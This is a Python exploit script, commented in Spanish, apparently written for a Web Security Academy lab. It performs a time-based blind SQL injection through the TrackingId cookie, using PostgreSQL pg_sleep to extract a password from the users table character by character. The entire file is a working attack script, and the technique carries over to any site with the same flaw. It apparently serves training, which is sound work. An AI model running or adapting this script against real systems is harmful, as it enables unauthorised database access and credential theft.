#!/usr/bin/python3

from pwn import *
import requests, time, string, pdb, signal, re

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables globales
main_url='https://0a67002803ca93378600f7c800e90045.web-security-academy.net/'

def makeRequest():
  p1 = log.progress("Blind SQLI")
  p1.status("Iniciando ataque de fuerza bruta basado basado en tiempo")

  p2 = log.progress("Data")
  p3 = log.progress("Character")
  time.sleep(2)
  final_data = ""

  x = requests.get(main_url)
  cookie = x.cookies
  trackingid = cookie.get('TrackingId')
  session = cookie.get('session')
  characters = string.ascii_lowercase + string.digits
  puntoycoma="%3b"
  for position in range(1,25):
    for character in characters:
      sqli="'%s select case when (substring(password,%d,1)='%c') then pg_sleep(3) else pg_sleep(0) end from users limit 1-- -" % (puntoycoma, position, character)
      cookies = {'TrackingId': trackingid + sqli, 'session': session}
      p3.status(character)
      time_start = time.time()
      r = requests.get(main_url, cookies=cookies)
      time_end = time.time()
      if time_end - time_start > 3:
        final_data += character
        p2.status(final_data)
        break
if __name__ == '__main__':
  makeRequest()
